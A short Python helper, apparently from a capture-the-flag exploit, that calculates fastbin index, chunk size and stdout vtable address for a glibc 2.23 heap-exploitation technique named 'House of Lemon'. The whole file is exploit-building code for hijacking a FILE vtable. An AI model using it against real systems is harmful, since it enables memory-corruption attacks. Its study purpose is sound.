"""House of Lemon glibc 2.23 fastbin-overflow sink calculations."""
from dataclasses import dataclass
@dataclass(frozen=True)
class LemonPlan:
    request_size: int
    chunk_size: int
    fastbin_index: int
    stdout_vtable_addr: int
    fake_vtable_addr: int

def build_house_of_lemon(*, stdout_addr: int, main_arena_addr: int,
                         fake_chunk_header_addr: int, request_size: int = 0x17B0,
                         global_max_fast: int = 0x2000) -> LemonPlan:
    """计算 2.23 Lemon 的越界 fastbin 投递，不解析 libc 私有符号。

    stdout_addr: `_IO_2_1_stdout_` 对象地址；main_arena_addr: 已泄露的 main_arena。
    fake_chunk_header_addr: 待写入 stdout vtable 槽的 fake chunk header。
    request_size: PoC 默认 `0x17b0`，物理 chunk size 为 `0x17c0`。
    global_max_fast: 需先由题目原语写入的上限。
    """
    if request_size != 0x17B0 or global_max_fast < 0x17C0: raise ValueError("this PoC branch requires request 0x17b0 and enlarged global_max_fast")
    vtable = stdout_addr + 0xD8
    index = (vtable - (main_arena_addr + 8)) // 8
    chunk = (index + 2) << 4
    if chunk != 0x17C0: raise ValueError("addresses do not match the validated 2.23 layout")
    return LemonPlan(request_size, chunk, index, vtable, fake_chunk_header_addr)
